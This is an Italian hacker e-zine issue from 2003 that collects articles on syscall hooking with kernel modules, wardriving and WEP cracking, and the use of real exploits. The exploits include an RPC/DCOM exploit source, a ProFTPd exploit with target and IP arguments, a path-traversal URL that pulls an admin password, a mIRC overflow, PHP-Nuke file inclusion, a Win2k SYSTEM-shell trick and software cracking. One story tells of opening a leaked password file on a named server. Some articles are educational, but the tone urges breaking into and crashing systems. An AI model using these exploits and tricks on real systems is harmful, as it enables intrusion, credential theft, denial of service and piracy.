...
|     +...ProFTPd 1.2.7 configurazione e vulnerabilitα .......(Cyberdude)...+  |
...
|  +--[FILOSOFIA HACK]---------------------------------------------------------+
|     +.....................................................................+  |
|     +...Societα consumistica,cos'Φ e a cosa ci sta portando.(Bigalex).....+  |
|     +.....................................................................+  |
+------------------------------------------------------------------------------+
+------------------------------------------------------------------------------+
|N.B.                                                                          |
|... alcuni articoli sono stati trattati da pi∙ autori separatamente, il  tutto|
|rende solo pi∙ approfondito  lo  studio  di  alcuni  vulnerabilitα  riportando| 
...
|  sembrava possibile,ma tutto Φ stato realizzato, gli sforzi iniziali per     |
...
|  dopo usc∞ pure sul Mattino,esausto di crew dove tutti erano dei semidei     |
...
|  error404  e  se  non  mi sbaglio stava giα scrivendo per OndaQuadra, mi     | 
|  ricordo che mi  port≥  lui  in  azzurra,  prima da me poco frequentata.     |
...
|  canale finirono e lo spodest≥ #programming.. Ricordo che in #coding  ci     |
|  furono importanti nomi come endsub e altri di bismark.it. Tutto  ad  un     |
|  tratto cyber mi fα ciao amico...  Io quasi incredulo dopo  che  non  lo     |
...
|  thelord erano a sua disposizione ( cosa sbagliata)  perchΦ,  forse  per     | 
|  gelosia o per altro... per colpa della fusione tra il nascente infofree     |
|  che poi sarα informazionelibera e thelord,tutti i membri del mio canale     |
...
|  uno dei migliori  olimpionici  defacer di questa estate e che ora si  Φ     |
...
|  poco tempo fa, quando per divergenze dirigenziali si Φ allontanato.Sono     | 
|  sicuro che infondo infondo legge ancora la nostra zine, avendo  vissuto     |
|  pi∙ di me e cyber messi insieme la vita di canale:  elaborando  quiz  e     |
|  girovagando  nei  canali  alla ricerca di un bot e nell'intendo di fare     |
|  pubblicitα, con le sue paranoie nel cercare sempre di fare di pi∙  xchΦ     |
...
|  giorni sempre con novitα grandiose; i membri crescevano settimana  dopo     |
|  settimana da 10 a 30 fino al picco di 43, inutile dirvi che  poi alcuni     |
|  non hanno  mantenuto la parola data. Il lavoro del  grande  Caligola  Φ     |
...
|  simbolo del vero spirito hacker. PerchΦ proprio formiche e perchΦ  tre?     |
|  PerchΦ  le  formiche  cooperano assiduamente per uno scopo comune e non     |
...
|  altri membri e questo non glielo perdoner≥ mai,  ci hanno abbandonato :     |
...
|  che stressati dalla "relativitα dell'inutile  relativitα" di quello che     |
|  facciamo, hanno abbandonato la crew dicendo che non accenderanno pi∙ il     |
|  computer finchΦ non avranno delle idee + chiare,       tipo Lord_Jex...     |
|  kmq nel nostro gruppo ognuno Φ libero di fare quello che vuole,   eh...     |
|  Φ questo il concetto della crew!Anche noi purtroppo volendo seguire una     |
|  certa linea di serietα di produzione, abbiamo fatto delle scelte,alcune     |
|  volte abbiamo fatto bene,altre volte anche se  in  buona  fede, abbiamo     |
|  sbagliato: in proposito Φ nato lo "Statuto di InformazioneLibera"  dove     |
|  sono descritte tutte le regole di produzione della crew e dei diritti e     |
|  doveri dei membri... Inutile dirvi che questo progetto Φ  nato  free  e     |
|  morirα come Φ nato: tutti noi ci  auguriamo  il  pi∙  tardi  possibile.     |
|  Per adesso in google come risultato di ricerca  siamo i  primi e questo     |
|  significa che ci vogliono bene...  ci≥ rende tutti noi pieni di  gioia!     |
|  Anche nella maturitα potremmo comunque continuare a scrivere, non credo     |     
...
|  chiameranno nuovi soci e cos∞ via, finchΦ  esisterα  una  idea  comune,     |
|  esisterα anche informazionelibera. La  ruota  di  InformazioneLibera  Φ     |
|  sciolta  da  qualsiesi  legame  commerciale  ed  Φ  questa la sua forza     |
|  ,       perchΦ gira per tutti allo stesso modo! Per correttezza bisogna     |
|  ricordare  tutti  gli  altri  grandi members che si sono aggregati dopo     | 
|  l'uscita della prima e della seconda zine...  a  tutti  questi che mi Φ     |
|  difficile ricordare a memoria va un mio pi∙  caloroso  abbraccio  nello     |
|  sperare che stiano sempre con noi.  Scusatemi ancora se qualcuno di voi     |
|  non Φ stato citato,  comunque unrelated e cyberdude sono sempre l∞, nel     |
...
In  questo  articolo tratter≥ della programmazione di moduli  per  linux  kernel
serie  2.4.x,  in particolare tratter≥ un argmento sempre vivo nell'hacking  del
kernel,  le  syscall,  infatti  vedremo per i  pi∙  estranei  all'argomento   di
...
---Cosa si intende per: syscall-------------------------------------------------
  ...
  Le  syscalls  sono  le suddette "Chiamate di sistema". Pi∙  semplicemente,  le
...
questo  programma,  contenuto  in forma binaria nella  dir  /usr/bin/,  andrα  a
chiamare  una  syscall,  in questo caso la getdents,  che  andrα  a  listare  il
contenuto  della  directory  attuale (se non specificata).  Queste  chiamate  di
sistema,  possono  essere  giα  implementate nel kernel,  oppure  risiedenti  in
qualche  LKM, (ed Φ proprio con quest'ultima opportunitα, che si possono hackare
...
interrupt  (mascherato), Φ $0x80, 'int $0x80', e quando  questa  funzione  viene
eseguita  il controllo del tutto viene dato ad una funzione del kernel  chiamata
_system_call()  che a sua volta chiamerα ret_from_sys_call() per controllare  le
attivitα in processo, per poi infine tornare allo user-space. In linux  tutti  i
...
tabella Φ necessario dichiarare la variabile esterna con la stringa:
...
quale "Function not implemented". perchΦ la syscall chiamata non esiste e quindi
non Φ implementata o un errore di tipo "Bad address", per testare il tutto,basta
...
inesistente) in questo modo:
  ...
  E  usando il perror() riferito a questa funzione, verrα restituito un  errore,
riferito all'incorrettezza del numero della chiamata di sistema.

---Uso delle chiamate di sistema------------------------------------------------

  L'uso delle syscall in un lkm, Φ molto pi∙ facile di quanto si possa credere e
credo  che  sia pi∙ difficile spiegarlo che metterlo in pratica.  ad  ogni  modo
...
della  syscall  usando nome_sys=sys_call_table[__NR_getuid]; lo  so  non  Φ  una
...
getuid, perchΦ Φ la pi∙ usata e la pi∙ adatta per questo tipo di esempi.
...
---Syscall hooking--------------------------------------------------------------
  ...
  Dunque,  "hooking",questa parola risulterα a molti ancora sconosciuta,  questo
termine  Φ  traducibile in italiano come "Agganciare", ed Φ un p≥  l'azione  che
...
nostra  scelta insomma, ed Φ la tecnica pi∙ semplice in assoluto, ma veniamo  al
...
void cleanup_module(void)
{
 ...
 -EOF-
  ...
  Nulla  di nuovo ovviamente, ma esaminiamo bene uello che si Φ fatto. Guardando
pi∙  a  fondo il codice sovrastante, possiamo trarne fuori 2 regole estremamente
...
nell'init,  andrα  a  sostituire la funzione della vecchia write()  e  quindi  a
...
Ma  ovviamente  Φ un metodo 'stupido', poichΦ verrebbe scoperta  a  distanza  di
...
e  andrα  messo  in  ordine  crescente a seconda del numero  della  syscall  che
assegnamo   il   secondo   passaggio,   Φ   l'aggiunta   di   un   simbolo    in
...
(tengo  a  precisare che Φ la scelta appropriata per l'esempio l'uso del  .c  di
...
asmlinkage long sys_foobar( struct trivial_t *buf )
{
 ...
 -EOF-
  ...
  Ora la nostra syscall Φ pronta per l'uso, non farα altro che copiare la trival
struct del kernel, in userland e assumere valore di ritorno -1 su fallimento e 0
su  successo. Ammetto di aver superficializzato l'argomento in questione, ma pi∙
in basso rilascier≥ riferimenti e link utili allo studio approfondito.
...
come 'scovare' le syscall hookate e riconoscerle da quelle 'naturali'.
  ...
  Ci  sono  veramente  molti  modi per il detecting,  ma  riconosco  che  i  pi∙
importanti sono come prima cosa, il testing manuale, ovvero, provare un  listing
dei mod  presenti e cercarne di sospetti, questo usando 'lsmod'.  Questo per≥ ha
un suo contro, difatti se l'attacker, ha hookato la syscall richiamata da lsmod,
ovvero  la  getdents(2),  cΦ  il  pericolo,  anzi  la  certezza  di  non  potere
visualizzare  gli  lkm  interessati.. Quindi si pu≥ passare  ad  un  metodo  pi∙
recente,  chiamato  da  xenion Syscall benchmark, che consiste  nel  testare  le
'funzionalitα'  di una syscall, basandosi non sul rendimento e le  potenzialitα,
...
hookata,avrα  sempre  un tempo di riuscita maggiore di una normale  syscall.  Ho
...
importante Φ l'uso di 'chkrootkit' che usa questi metodi pi∙ altri metodi sempre
...
---Conclusione------------------------------------------------------------------
  ...
  E  cos∞ posso chiudere questo tutorial, spero di essere stato chiaro per tutti
ed  esaudiente  per  i  pi∙ interessati, potete comunque  per  qualsiasi  motivo
...
......ò.............
........ò.òò.............
....òòòòòòòò...òòòòòòòò...............  Esperienze    Googliane ........
....ò.òòòòòò.òòòòò......................................................
..òòòòòòòòòòòòòòòò............          Lord Unrelated Lodeguns ........
òòòòòòòò.òòòòòòòòòò.....................................................
..................................      24 Settembre 2003 20.29 ........

 Ora con  questo tutor, forse  un  p≥  campato in aria, per una serie di 
 combinazioni di elementi, vorrei  raccontare  l'esperienza  che   mi  Φ
 ...
 quello che vi dir≥ suona bene.. se no perdonate la mia ignoranza...  :D
 ...
 evitare di addormentarmi... vedo una cosina che mi manda &lt;nnvuoldirkiΦ>

 &lt;nnvuoledirkiΦ> ciao unre
 &lt;unrelated> ciao
 &lt;nnvuoldirkiΦ> http://hercules.ifsi.rm.cnr.it/meeting/HIFI/_vti_pvt/service.pwd
 &lt;unrelated> c stai
 No such nick/channel
 -> *MemoServ* SEND nonvuoledirechiΦ ma lo hai giα aperto? il service... kmq grazie ora
 vedo che ci sta :D
 Session Close: Mon Sep 22 18:30:06 2003
 
 a  primo impatto ho creduto... caz ora mi prendo un'altro green cos∞ se
 ...
 deh hi he he doh... dico sta roba sarα una pass.. controllo il  server
 ...
 hihih comodo cos∞ vero? kmq per adesso tutto nella  normalitα sappiamo
 che un sito hostato su un apache viene gestito da un admin  ubriaco...
 capita..  purtroppo nessuno  Φ  perfetto ma... e  dovete stare attenti
 ...
 ma cos'Φ uorge00xoj? boh.. ipotizzo che google abbia bucato per me il
 ...
 intanto  ho creduto mi darα un errore della minkia ed  ho  perso solo
...
[...]
 ...
 &lt;unrelated> ed il gioco Φ fatto
 &lt;unrelated> hihi
 &lt;cyberdude> ke cazzata
 &lt;cyberdude> ... questi sono idioti proprio
 &lt;cyberdude> hihihi

 e va bu≥ l'articolo Φ finito.. quando volete bucare qualche server non
 ...
 Ora scappo perchΦ in tv tra un pochino fanno CSI e non me lo perdere!!
 Ciao amici della crew.. AH colgo l'occasione per dirvi di animare  un
 pochino il forum di IL che per adesso Φ un p≥ scarno.
......òòò.òòòòòòòòòòòòòòò................
.......òòò.òòò.ò...òò.òòò.............
.......òòòòòòòòòòò.òò.............
..........òòòòòòòòòòòò.ò...............
...
óòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòòò
...
......ò.............
........ò.òò.............
....òòòòòòòò...òòòòòòòò...............    Antenne all'attacco!  ........
....ò.òòòòòò.òòòòò......................................................
..òòòòòòòòòòòòòòòò............          Lord Unrelated Lodeguns ........
òòòòòòòò.òòòòòòòòòò.....................................................
..................................       04 Ottobre 2003 22.22  ........
.Networking Evolution >-------------------------------------------------
 Dal titolo potete giα capire che sicuramente le reti wireless che d'ora
 ...
 eliminiamo i tanto fastidiosi cavi, la velocitα Φ la stessa e in alcuni
 ...
 saltare il collegamento e per ultimo  il  w.  offre  la  possibilitα  a 
 persone esterne qualora opportuno di collegarsi facilmente alla rete...
 hihi qualcuno penserα collegarsi facilmente non credo che  sotto  sotto 
 sia  un  pregio  ma  un  difetto...  beh  io  risponderei  "dipende" :)

.IEEE dal 97 a oggi >---------------------------------------------------
 Giα nel Giugno del 97 la IEEE aveva elaborato un metodo per trasmettere
 ...
 sulle frequenze si circa 2,5 GHz cioΦ alla velocitα di circa  11 Mpbs e
 la 802.11a che aveva una frequenza di 5GHz e che quindi era in grado di
 fornire una velocitα che era di circa 56 Mbps
 ...
 * la WECA Φ composta da consorzi  tipo  la  Apple,  Compaq  e  altri...
 Da notare un altro progetto w. cioΦ Bluetooth che favoriva  una  sicura
...
.Hacking di una rete Wireless >-----------------------------------------
 ...
 base con il solito hub con vari host  e quelli  indipendenti  cioΦ  che 
 ...
 fare... anche perchΦ  comunque non  sono  di  facile  configurazione...
 perci≥ le possibilitα  di  attacco  sono  varie...  ricordiamo  che  le
 onde radio,x esempio di un potenziale di 100 metri, messe in una stanza
 di 80 metri non Φ che si bloccano, ma vanno fuori di 20 metri..  e  poi
...
.Attrezzi del Mestiere [Wardriving(in macchina) e Warwalking(a piedi)] 
 ...
 aziende e in grossi uffici di cittα, ma in pratica non Φ cos∞  semplice
 ...
 in ITALIANO come costruirsi una antenna  barattolo,  l'articolo  Φ  del
...
.A caccia di Onde!
 ...
 Identifer),  se  abbiamo  culo e  il  protocollo  DHCP Φ attivo abbiamo 
 accesso diretto.

.Protocollo WEP
 Se la rete Φ protetta possiamo tentare anche di violare il  protocollo
...
.Jamming (DoS)
 ...
 alla  rete  da  attaccare  cos∞  sovrapponendo  i segnali chi si vorrα
 collegare si troverα l'accesso negato.

.Legge >----------------------------------------------------------------

.Codice delle comunicazioni elettroniche.
 
 Non so a chi potrα interessare, ma  visto  che  ho  studiato  per  puro
 ...
 una cosa Φ certa farsi  una  antenna  non  Φ  incriminabile,  usarla  a 
 scapito di altre persone s∞, anche se:
 Per radio  amatore  come  dice  la  gazzetta  Φ  intendibile  qualsiesi
...
......ò.............
........ò.òò.............
....òòòòòòòò...òòòòòòòò...............   Remote Procedure Call  ........
....ò.òòòòòò.òòòòò......................................................
..òòòòòòòòòòòòòòòò............          Lord Unrelated Lodeguns ........
òòòòòòòò.òòòòòòòòòò.....................................................
..................................       09 Ottobre 2003 20.41  ........
.I ragazzi dell'LSD >---------------------------------------------------
 hihih... non Φ una droga che si prendono i ragazzi di questo gruppo di
 security ;D ma semplicemente la sigla Last Stage of Delirium,    hanno 
 scoperto prima della microsoft  delle  possibili  vulnerabilitα  sulla
 Remote Procedure Call, cosa che credo gli faccia mooolto onore.

.Cos'Φ l'RPC e come funge >---------------------------------------------
 ...
 Per  prima cosa  Φ distruttivo da win98 in su, fino al  windows server 
 ...
 connessione, indirizza il client alla porta  giusta.  CioΦ in effetti,
 ...
 concetto globale che anni fa era quasi un utopia, cioΦ l'inter-process
...
|||||||
 ...
 Allora  semplicemente  l'RPC  non  Φ destinabile  a prescidere... cioΦ
 sbatte pi∙ o meno a caso una richiesta presentando una identificazione
 ...
 Molti si chiedeno ma perchΦ si parla di una vulnerabilitα DCOM?
 il  Distributed Component Object Menager Φ un protocollo che serviva a
...
.Attacchi all'RPC >-----------------------------------------------------
 ...
 1) Quello di www.xfocus.org Φ avviabile dai sistemi unix con la raga di
 ...
 ammetto, mi compro x tenermi informato sempre un p≥ di +, ci mettono la
 ...
 mi basta un gesto come il water e sei giα in partenza/
...
---8<------8<------8<------8<------8<------8<------8<------8<------8<---
 ...
 3) www.securiteam.com per un buon attacco DoS.. pss... negli allegati
    ...
    una frase di vorago "un lamer Φ colui che usa programmi del cazzo
    prefatti dove c'Φ solo il tasto hack e exit" ;) riflettete
    kmq provatelo pi∙ di una volta per avere l'effetto desiderato...
    attenzione anche se il + piccolino Φ quello fatto meglio fin ora
    potremmo dire quello + cattivo... il bollettino microsoft inerente
    a questo exploit Φ MS03-010
...
---8<------8<------8<------8<------8<------8<------8<------8<------8<---
 ...
 Beh che dire visti i vari numerini si  pu≥  facilmente  intendere  che
 sono attacca buffer overflow ...      (anche il mio pesciolino se ne Φ
 accorto ma per completezza ho ritenuto opportuno dirlo) e anche se non
 dovrei dirlo,dopo questi attacchi il programma vi dirα  su quale porta
 ...
 eh anche questo exploit Φ andato vi ricordo che negli allegati trovate
 un exploit giα codato... il miglore) e gli altri da codare... vi resta
 solo che studiare e non divertirvi a crashare sistemi... hihi anche se
 per prova qualcuno purtroppo Φ andato a puttane... ma come si dice io
 ...
 ah vi ho mai detto che la chiave della  vita  Φ  essere  perennemente 
 felici?  beh  penso  di  farci  sopra  un  bel  trattato   flosofico.
 Ah kmq fisicamente Φ bona la ragazza di cyber... buhahahahahaaahahahi
......òòò.òòòòòòòòòòòòòòò................
.......òòò.òòò.ò...òò.òòò.............
.......òòòòòòòòòòò.òò.............
..........òòòòòòòòòòòò.ò...............
...
di una vulnerabilitα, una vulnerabilitα scoperta dalla  microsoft  nel RPCà per 
...
la rete. Quando si parla di RPC il pi∙ delle volte si intende la  variante  Sun 
RPC. Ora la falla esiste nel servizio di RPCSS ed Φ collegata con il codice che 
maneggia i  messaggi  del  RPC  per  l'attivazione  di  DCOM quindi  pu≥ essere 
...
void main(int argc,char ** argv)
{
    ...
    memcpy(buf2,request1,sizeof(request1));
    len1=sizeof(request1);
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;  //╝╞╦π╬─╝■├√╦½╫╓╜┌│ñ╢╚
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;//╝╞╦π╬─╝■├√╦½╫╓╜┌│ñ╢╚
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sc,sizeof(sc));
    len1=len1+sizeof(sc);
...
Occhio per≥ cari i miei ragazzi perchΘ la Microsoft ha gia rilasciato  le patch 
...
Penso che non ci sia altro da aggiungere su questo  argomentoà  se  serve altro 
chiedete ok? Ora vi saluto ragazzià alla prossima

Cyberdude 


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: ProFTPd 1.2.7 configurazione e vulnerabilitα                        |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Buona  sera  a  tutti ragazzià oggi gioved∞ 16 ottobre 2003 sono appena  tornato
dalla piazza, da poco ho finito di papparmi un bel gatt≥ fatto da mammα!! E  ora
con  lo  stomaco  pieno sono qui vicino (come al solito) a scrivere  un  piccolo
articoletto giusto per diffondere lÆinformazioneà hhihihi questa storia ormai  Φ
diventata  il  mio  credo! Informiamo sempre di pi∙ la  gente,  se  solo  ognuno
dicesse quel poco che sa (come faccio io) allora tutti sapremmo qualcosa in pi∙!
Comunque  basta  con  tutte queste presentazioni da 4 soldi  e  proseguiamo  con
lÆarticolo. Di cosa posso parlarvi? Vediamo un poÆ!!io di cose non ne so  molteà
ah  ecco  potrei parlarvi di ProFTPD, vediamo chi indovina cosa sia 1,2,3  vabbΦ
...
sono le seguenti :
1.  configurabilitα elevata
2.  personalizzabilitα idem come sopra
Questo  server Opens Source riguarda sistemi operativi quali RedHat e Suse.  Per
quanto  riguarda la reperibilitα del prodotto in questione Φ molto semplice,  ci
basta  collegarci al suo sito http://www.proftpd.org/  e scaricare il  programma
allÆindirizzo       ftp://ftp.proftpd.org/distrib/source/proftpd-1.2.9rc3.tar.gz
àAdesso passiamo alla configurazione del server.
1.   Decomprimiamo i sorgenti ed entriamo nella relatva cartella --> tar  zxvf
     proftpd-1.2.7.tar.gz - cd proftpd-1.2.7
2.  configuriamo l'installazione e compiliamo --> ./configure û make
...
inseriamoci  lÆindirizzo  del nostro server DynDNS poi  cerchiamo  la  riga  che
inizia  con ServerType e sostituiamo "standalone" con "inetdö à poi alla stringa
Group  al  posto  di "nogroupö ci mettiamo "nobody" . A questo punto  dopo  aver
...
/etc/xinetd.d/ftp"à ora dove cÆΦ server_args = -1 sostituiamo  il  û1  con  Well
...
E  qui abbiamo discusso un poÆ su come scarica, installare, configurare, avviare
il  server  in questioneà ma voi vi chiederete, qual Φ il bello della faccenda??
Che  come  al  solito  non  poteva mancare una vulnerabilitα  sullÆargomento  in
questione!! Hihihi dunque di cosa si tratta?? ╚ un Exploit testato su SuSE  8.0,
8.1  e  RedHat  7.2/8.0.  La  RedHat riscontra la  vulnerabilitα  nella  regione
0xbffff2xx  mentre  il Suse in quella 0xbfffe8xx ora qui di  seguito  vi  allego
lÆexploit che richiameremo tramite la stringa : ./proft_put_down -t hostname  -l
localIP  -U incoming dove hostname = target box e localIP = il vostro  indirizzo
IP. Adesso che devo dirvi pi∙?? Vedete dove sta scritto ûU ?? bene questo sapete
a cosa serve? A creare una directory nella quale lavorerα sul server ftp remoto.
Senza  esso Φ difficile che lÆexploit funzioni. Detto questo vi allego lÆexploit
...
hihihi qui finisce l'articolo non c'Φ pi∙ niente qui sotto!! ciao raga, sono  le 
21:00 ci ho messo 30 minuti +o- qualcosa in pi∙ qualcosa  in  meno  ma  comunque 
stiamo la! Spero che questo sia servito a qualcosa o se non Φ servito  a  niente 
almeno ho person un p≥ di tempo!!! Colgo l'occasione per mandare  a  quel  paese  
il mio caro amico Unrelated! Che bastardo che sei! La mia ragazza Φ solo mia ok?
...
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Eccoci di nuovo qui,un altro articolo di hacking, ancora Cyberdudeà oggi voglio 
...
Internet àNetzero chiede ai suoi utenti di eseguire l'applicazione ZeroPort per 
registrarsi sulla rete. Quando avviene la registrazione Nome utente  e Password 
vengono registrati nel file id.dat. Ora voi direte dov'Φ il punto? Eccolo qui : 
il sistema di crittografia Φ  molto ma  molto  scadente,  inoltre  se l'opzione 
"salvo password" Φ abilitata possiamo  ritrovare  tali  dati  anche in  un file 
chiamato jnetz.prop. Chiaro fino a questo punto?  Adesso  se un  normale utente 
riesce  a  mettere  le  mani  su  tali   file  sarα molto  semplice riuscire  a 
decodificare il  file  jnetz.prop  grazie  ad  un  sistema  di  sostituzione ed 
impossessarsi di nome utente e password. Il codice  di  sostituzione classico Φ 
una corrispondenza 1a1 tra caratteri dove ogni carattere plaintext Φ sostituito 
...
della lunghezza 'n', il primo carattere ciphertext Φ C_i e il secondo carattere 
Φ C_n+ià vabbΦ voi ora direte ma cyberdude che  cavolo mi  sta dicendo? a me le 
...
pi∙à la cosa importante Φ che riusciate a prendere  il file  jnetz.prop (vedete 
...
Chiaro? Semplice vero? Ed ora eccovi il sorgente à se serve  una  mano chiedete 
...
persone diverse dalle altreà non vi  offendete, non  sono  razzista  o cose del 
genere, ne scrivo solo per gente preparata in informatica, il punto sta che per 
sfruttare questo articolo al meglio delle sue potenzialitα, il lettore dovrebbe 
...
Intranet 2.0 b e AltaVista Search Intranet 2.3 A chiaro? Si proprio cos∞ perchΘ 
questi due motori di ricerca sono facilmente vulnerabili e  possiamo  con poche 
stringhe di testo impossessarci del motore e comandare la nave ;) àprima vorrei 
...
ricerca accetterα una singola  stringa di  questo  genere -> "/" per proseguire 
...
interessanti perchΘ contengono la password per  l'amministrazione  del sistemaà 
chiaro? Tale password codificata in Base64 Φ facilmente recuperabile con un po' 
di   stringhe  di  codice à   e  adesso  passiamo  alle   stringhe  di  codice. 

Dunque se provate a digitare : 
http://target:9000/cgi-bin/query?mss=../logs/mgtstate 
otterrete il file mgtstate dove Φ contenuta la password che ci interessa 
...
Detto questo ci metto un punto e vi saluto à ciao ragazzi alla prossima 
...
Buon giorno ragazzi à Sabato 18 ottobre 2003, tra due giorni esce la prossima e-
zine, io non ho proprio un bel niente da fare e allora scrivo qualche cosa! Oggi
non  sono andato a scuola perchΘ ieri sera sono andato a una festa di 18 anni  e
son tornato allÆ1:30 quindi alzatomi di buonora (11:30) ho fatto festa a scuola!
Dunque  stamattina stessa, navigando in un forum il quale nome non riporter≥  ho
...
Inoltre  mi  sembra  che il rendering sia ancora pi∙ veloce che  nelle  versioni
precedenti  (e non Φ poco). Rimane da vedere l'aspetto sicurezza  (fino  a  poco
tempo fa qualche problemino  l'aveva), comunque Φ da provare.
-------------------------------------------[END DISCUSSIONE]--------------------
...
(Apro questa piccola parentesi per spiegare che Opera Φ un browser proprio  come
internet Explorer e tanti altri per la navigazione in internetà ok???)

A  questo  punto  io  mi son chiesto à davvero sto nuovo prodotto  dello  zio  Φ
...
siti  pi∙  conosciuti in rete per software viene valutato cos∞  :  Valutato  dal
webmaster 9 /10 à  provvedete subito a toglierlo di mezzo! PerchΘ in questo caso
il  webmaster non ha capito bene le ôpotenzialitαö del prodotto!!! Volete sapere
cosa basta fare per mandare in crisi Opera7.10??? Ve lo dico subito io!

news:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Ecco,  questo  Φ  quanto basta!! hahahahaha ma che ridicolaggine,  una  news  di
lunghezza  eccessiva innesca sul browser una condizione che rende inutilizzabile
il  software fino alla sua prossima reinstallazione!! Congraturazioni Zio  Billà
...
+------------------------------------------------------------------------------+
 +----------------------------------------------------------------------------+
 |P.S. pre scrittum                                                           |
 |KoRnuto cambia nick, d'ora in poi sarα Eimiar                               |
 |                                                                            |
 ...
 +=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+
 |                                                                            |
 |Per parlare dell'IP spofing, vi devo dire che cos'Φ l'IP...                 |
 |per dirvi che cos'Φ l'IP devo dirvi cos'Φ un computer... (ma baff...)       |
 |per dirvi cos'Φ un computer... (BASTA!!!!)                                  |
 |                                                                            |
 |Quando gli Americani crearono INTERNET (ALEEEEE!!!) per comunicare con la   |
 |Russia a tempo record, ebbero la necessitα di dare una "carta d'identitα" a |
 |tutti i computers... questa carta d'identitα, formata da delle cifre XAMPLE |
 |123.45.67.89 (Φ un'IP) serviva per riconoscere un computer, ma, dato che    |
 |stiamo parlando di computers, allora ci dev'essere un modo per mascherare   |
 |questo IP (nella realtα si potrebbe comprare dal marocchino di fiducia dei  |
 |documenti falsi :D ) ma, dato che per riconoscere dei computers, c'Φ solo   |
 ...
 |d'identitα che non permetteva all'hacker di svolgere il suo MESTIERE...     |
 |L'IP dunque Φ un numero a 32 bit di 8 bit ogni quarto di IP (123.45.67.89)  |
 |                                                                            |
 |oggi vi parler≥ di questa tecnica...                                        |
 |                                                                            |
 |mettiamo che per conservare la nostra anonimitα,non vogliamo dare in giro   |
 ...
 |Dos e mettiamo la seguente riga per configurare l'instradamento (perchΘ     |
...
Esiste una vulnerabilitα nel pi∙ popolare IRC client per windows che permette  a
...
sia  minore  di  110bytes. Se la stringa di risposta dell'host Φ  pi∙  lunga  di
110bytes causerα l'overflow in mIRC.
...
Come  possiamo  notare  sendando una risposta  di  pi∙  di  110  bytes,  accadrα
l'overflow:
:server.com 302 Victim:Victim=+~b@

Per  sfruttare al meglio l'exploit l'attaccante, per≥, avrα bisogno di  fare  il
seguente:

-  Trovare la vittima che si connetta al suo server mIRC ( in questo caso ci pu≥
...
Abbiamo  detto  che  la vulnerabilitα permette di sendare codici  arbitrari  che
verranno  eseguiti  sulla  macchina  della vittima  (  costringendo  l'utente  a
connettersi al server ) usando l'indirizzo API dal mIRC.exe. Non c'Φ bisogno  di
...
L'exploit  in  questione  tenterα di eseguire un comando  a  vostra  scelta,  di
default Φ impostato calc.exe e mIRC andrα in crash.
...
non  credo  che faccia male a nessuno: Il PHP-Nuke non Φ altro che un  programma
open-source per creare e amministrare siti web.


PHP-Nuke  sfortunatamente  permette  ad utenti  remoti  di  includere  file  non
autorizzati all'interno del codice PHP attraverso una vulnerabilitα  nel  modulo
...
Un  utente  remoto ha la possibilitα di sendare una speciale stringa  attraverso
...
all'interno del web server e avendo anche la possibilitα di ottenere il database
contenenti user e password.


Il codice vulnerabile in questione Φ il seguente:
...
Per  exploitare  questa vulnerabilitα non basta altro che inserire  la  seguente
...
sapete  ProFTPD  Φ un server estremamente configurabile che permette  attraverso
...
La  vulnerabilitα pu≥ essere provocata da un utente remoto quando viene eseguito
il  trasferimento  di file dall'FTP in modalitα ASCII mode. L'utente  remoto  in
questo caso deve avere la possibilitα di upluodare file all'interno del server e
attendere il download per provocare la vulnerabilitα.

Ma come avviene la vulnerabilitα ?

La  vulnerabiltα avviene quando un file viene trasferito in ASCII mode,  durante
il  trasferimento  il file Φ esaminato in 1024 byte per controllare  il  comando
newline (\n).  La traduzione di questi caratteri non Φ maneggiata corettamente e
...
privilegi  all'utente  remoto. X-Force ha dimostrato che  questa  sicurezza  pu≥
...
questa  vulnerabilitα  potrebbero distruggere,  nascondere,  o  manipulare  dati
all'interno del FTP vulnerabile.


Se  l'utente  remoto,  per≥,  non pu≥ upluodare  nessun  file  non  Φ  possibile
exploitare la vulnerabilitα. Consiglierei di (dove Φ possibile) disabilitare  la
possibilitα  che permette ad utenti remoti di upluodare nell'FTP,  con  permessi
...
Al momento non esiste ancora una patch ufficiale per questa vulnerabilitα.


Posto di seguito l'exploit per testare la vulnerabilitα del proprio server:
...
Win2000  Φ  affetto da un piccolo bug riguardante la schermata di log-on,  nella
...
per  ottenere  privilegi elevati sulla macchina. L'Hack  in  questione  Φ  molto
semplice:  Φ  sufficiente entrare nella macchina come utente di   dominio  senza
privilegi  di amministrazione e recarsi (almeno per win2k) in C:\WINNT\System32.
Qua  Φ  possibile modificare il nome del file logon.scr (che Φ appunto lo screen
...
all'avvio  dello screen saver partirα invece  un prompt di comandi con privilegi
SYSTEM!!  A  questo punto l'utente sarα in grado di modificare il regedit  o  di
lanciare un qualsiasi script.  In ogni caso, al posto di cmd.exe, sarα possibile
...
Nota  [ vulnerabilitα testata su win2k, ma probabilmente presente anche su NT  e
XP ]
...
nessuna   responsabilitα derivante dell'uso improprio fatto con le  informazioni
qui apprese.
...
:01D224B1  test  AL, AL ; se il serial immesso Φ giusto...
...
invece,  facciamo qualcosa di estremamente pi∙  semplice,  e  per   di   +   non
dovremo  modificare  manco una riga di codice...S∞, perke  a  sto  programma  se
forziamo   il jnz di qua sopra (r fl z con sice)  anke  la  prossima   volta  ke
lo   apriamo   ci  dira  ke  Φ registrato!  In parole povere insomma, ogni volta
ke   lo   apriamo,  non  fa  il check del serial...Bella roba...Il  programma  Φ
...
le   canne...Scusate cmq se questo tutorial  Φ  stato davvero corto, ma come gia
...
(Φ  incredibile come  si possa conoscere tanta gente a partire da  una  passione
...
Tutorial scritto interamente da Graftal il Marted∞ 8 luglio 2003.
...
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Come  la  maggior  parte  degli  utenti sa,il c Φ  successore  di  B,  un  altro
lingauggio  di  programmazione che girava prima  degli  anni  70.IL  c  Φ  stato
...
